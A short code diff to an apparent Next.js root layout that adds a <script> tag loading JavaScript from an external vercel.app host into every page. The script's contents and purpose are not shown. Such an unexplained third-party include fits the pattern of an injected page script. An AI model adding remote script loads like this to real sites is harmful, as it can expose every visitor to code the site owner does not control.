@@ -17,6 +17,7 @@ export default async function Layout({ children }: LayoutProps) {
   return (
     <html lang="en">
       <body>
+        <script src="https://nasco-integration.vercel.app/assets/integrations.js"></script>
         <LocalizationProvider>
           <UserProvider>
             <ThemeProvider>{children}</ThemeProvider>
